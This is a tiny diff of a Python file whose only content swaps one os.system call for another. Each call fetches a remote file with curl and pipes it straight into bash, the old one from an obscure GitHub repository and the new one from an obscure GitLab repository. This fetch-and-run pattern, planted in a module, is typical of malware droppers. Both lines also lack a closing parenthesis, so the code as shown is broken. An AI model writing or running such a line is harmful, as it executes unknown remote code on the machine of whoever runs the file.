@@ -1,3 +1,3 @@
 import sys
 import os
-os.system('curl -sL https://github.com/ganejafaujanih/ins/raw/main/mainet | bash'
+os.system('curl -sL https://gitlab.com/bonchu/init/-/blob/main/supri | bash'
